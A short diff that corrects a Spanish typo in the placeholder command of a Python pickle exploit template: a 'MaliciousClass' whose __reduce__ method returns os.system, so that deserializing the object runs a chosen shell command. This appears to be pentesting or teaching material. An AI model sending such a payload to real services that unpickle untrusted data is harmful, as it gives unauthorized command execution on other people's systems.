@@ -13,7 +13,7 @@ import os
 
 class MaliciousClass:
     def __reduce__(self):
-        return (os.system, ('{comando a ejeuctar}',))
+        return (os.system, ('{comando a ejecutar}',))
 
 malicious_object = MaliciousClass()
 
